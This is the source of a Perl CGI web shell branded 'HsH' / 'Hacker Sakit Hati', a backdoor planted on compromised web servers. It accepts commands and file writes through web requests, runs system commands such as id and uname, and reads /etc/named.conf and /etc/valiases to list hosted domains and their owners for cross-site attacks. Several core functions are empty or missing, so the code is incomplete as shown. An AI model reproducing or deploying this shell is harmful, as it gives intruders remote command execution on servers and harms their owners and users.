#!/usr/bin/perl -I/usr/local/bandmin
use MIME::Base64;
$Version= "CGI Shell";

 
sub Is_Win(){
 
}
 
 

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!
 
 
#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;
	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}
	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}
#------------------------------------------------------------------------------
# function EncodeDir: encode base64 Path
#------------------------------------------------------------------------------
sub EncodeDir
{
	my $dir = shift;
	$dir = trim(encode_base64($dir));
	$dir =~ s/(\r|\n)//;
	return $dir;
}
#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	my $id = `id` if(!$WinNT);
	my $info = `uname -s -n -r -i`;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<title>HsH</title>
</head>
<style type="text/css" media="screen">
body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
body {
	background:#;
	}

body,td,th,ul,p {
	font: normal normal normal 8pt/1em # ;
	color: #violet;
	}

textarea,input,select {
	font: normal normal normal 8pt/1em # ;
	color: #;
	background:#;
	}

a:link, a:visited {
	text-decoration: none;
	color: #;
	}

a:active, a:hover {
	text-decoration: underline;
	color: #;
	}

fieldset {
	padding-left: 10px; 
	padding-bottom: 10px; 
	border:1px solid #;
	}

legend {
	font: normal normal bold 9pt Arial;
	color: #;
	}

.bordercolor {
	background:#;
	}

.maincolor {
	background:#; 
	border:1px solid #;
	}

.button {
	background:#;
	}

.titlebarcolor {
	background:#;
	}

.titlefont {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

.copyrightfont, .copyrightfont a {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

</style>
 
<body onLoad="document.f.@_.focus()" bgcolor="#0c0c0c" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<center><code>
 

 


 
<font id="ResponseData" color="#FFFFFF" >
END
}
 
 
 
#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "</code></center></body></html>";
}
#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}
 
 
 
 
#------------------------------------------------------------------------------
#  Array List Directory panggone text usere cok
#------------------------------------------------------------------------------
sub RmDir($) 
{
 
}
 
sub trim($)
{
	my $string = shift;
	$string =~ s/^\s+//;
	$string =~ s/\s+$//;
	return $string;
}
sub AddSlashes($)
{
	my $string = shift;
	$string=~ s/\\/\\\\/g;
	return $string;
}
sub TrimSlashes($)
{
	my $string = shift;
	$string=~ s/\/\//\//g;
	$string=~ s/\\\\/\\/g;
	return $string;
}
 
#------------------------------------------------------------------------------
# Try to View List User
#------------------------------------------------------------------------------
sub ViewDomainUser
{
	open (d0mains, '/etc/named.conf') or $err=1;
	my @cnzs = <d0mains>;
	close d0mains;
	my $style="line";
	my $result="<center><h3><font style='font: 15pt Verdana;color: #25383C;'>Hacker Sakit Hati</font></h3><center/>";
	if ($err)
	{
		$result .=  ('<p>C0uldn\'t Bypass it , Sorry</p>');
		return $result;
	}else
	{
		$result .= '<table id="domain"><tr><th>domains</th> <th>User</th></tr>';
	}
	foreach my $one (@cnzs)
	{
		if($one =~ m/.*?zone "(.*?)" {/)
		{	
			$style= ($style eq "line") ? "notline": "line";
			$filename= trim("/etc/valiases/".$1);
			$owner = getpwuid((stat($filename))[4]);
			$result .= '<tr style="$style" width=50%><td><a href="http://'.$1.'" target="_blank">'.$1.'</a></td><td> '.$owner.'</td></tr>';
		}
	}
	$result .= '</table>';
	return $result;
}

#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

 
$Options = $in{'o'};
$Action = $in{'HsH'};

$Action = "command" if($Action eq ""); # no action specified, use default

# get the directory in which the commands will be executed
$CurrentDir = &TrimSlashes(decode_base64(trim($in{'d'})));
# mac dinh xuat thong tin neu ko co lenh nao!
$RunCommand= $WinNT?"dir":"dir -lia" if($RunCommand eq "");
chomp($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) 		# user needs/has to login
{
	&PerformLogin;
}elsif($Action eq "gui") # GUI directory
{
	&PrintPageHeader("d");
	if(!$WinNT)
	{
 
	}
	$rename=$in{'rename'};
	if($rename ne "")
	{

	}
	$remove=$in{'remove'};
	if($remove ne "")
	{

	}
	print &ListDir;

}
elsif($Action eq "command")				 	# user wants to run a command
{
	&PrintPageHeader("c");
	print &ExecuteCommand;
}
elsif($Action eq "save")				 	# user wants to save a file
{
	&PrintPageHeader;
	if(&SaveFile($in{'data'},$in{'file'}))
	{
		print "<run> Done! </run><br>";
	}else
	{
		print "<run> Sorry! You dont have permissions! </run><br>";
	}
	print &ListDir;

}elsif($Action eq "1337") 			# user wants to view list user/domain
{
	&PrintPageHeader;
	print &ViewDomainUser;

}
&PrintPageFooter;













